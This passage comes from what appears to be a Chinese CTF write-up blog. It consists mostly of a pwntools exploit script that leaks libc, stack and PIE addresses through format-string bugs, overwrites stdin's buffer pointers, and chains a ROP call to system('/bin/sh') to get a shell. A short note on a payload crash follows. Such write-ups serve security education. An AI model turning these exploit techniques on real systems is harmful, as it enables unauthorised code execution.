class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>) </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">            debug_str+=<span class="string">&#x27;b *&#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+i))</span><br><span class="line">        gdb.attach(p,debug_str) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">            debug_str+=<span class="string">&#x27;b *&#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+i))</span><br><span class="line">        gdb.attach(p,debug_str) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">name</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Choice &gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;User name:&quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">size,data</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Choice &gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input size:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo2</span>(<span class="params">data</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Choice &gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input size:&quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;say:&quot;</span>)</span><br><span class="line">    info=<span class="built_in">int</span>(p.recv(<span class="number">0xe</span>),<span class="number">16</span>)</span><br><span class="line">    base=info-addr</span><br><span class="line">    print(<span class="built_in">hex</span>(base))</span><br><span class="line">    <span class="keyword">return</span> base</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo(<span class="number">7</span>,<span class="string">&quot;%&#123;&#125;$p&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0xf</span>+<span class="number">6</span>)))</span><br><span class="line">libc.address=get_base(<span class="number">0x20840</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="number">7</span>,<span class="string">&quot;%&#123;&#125;$p&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0x1</span>+<span class="number">6</span>)))</span><br><span class="line">main_addr=get_base(<span class="number">-0x28</span>)<span class="comment">#栈地址到加载地址的偏移会变</span></span><br><span class="line"></span><br><span class="line">echo(<span class="number">7</span>,<span class="string">&quot;%&#123;&#125;$p&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0x9</span>+<span class="number">6</span>)))</span><br><span class="line">pie_base=get_base(<span class="number">0x1107</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_buffer_base=libc.symbols[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]+<span class="number">8</span>*<span class="number">7</span></span><br><span class="line">login(p64(io_buffer_base)[:<span class="number">-1</span>]+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;io_buffer_base:&quot;</span>,<span class="built_in">hex</span>(io_buffer_base))</span><br><span class="line"></span><br><span class="line">echo(<span class="number">7</span>,<span class="string">&quot;%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0xa</span>+<span class="number">6</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(libc.symbols[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]+<span class="number">131</span>)*<span class="number">3</span>+p64(main_addr)+p64(main_addr+<span class="number">8</span>*<span class="number">3</span>)</span><br><span class="line">echo2(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)<span class="number">-1</span>):</span><br><span class="line">    echo2(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># debug([0x00000000000106D,0x0000000000000F77])</span></span><br><span class="line"></span><br><span class="line">payload=p64(pie_base+<span class="number">0x00000000000011b3</span>)+p64(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>())+p64(libc.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">echo2(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Choice &gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># echo2(&quot;\n&quot;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>实际上这样构造payload的时候(多了个\n),实际上没有\n   scanf函数是能截断的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(libc.symbols[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]+<span class="number">131</span>)*<span class="number">3</span>+p64(main_addr)+p64(main_addr+<span class="number">8</span>*<span class="number">3</span>)+<span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><p>上面的payload会设置一些指针然后会造成崩溃.</p><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctf,wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
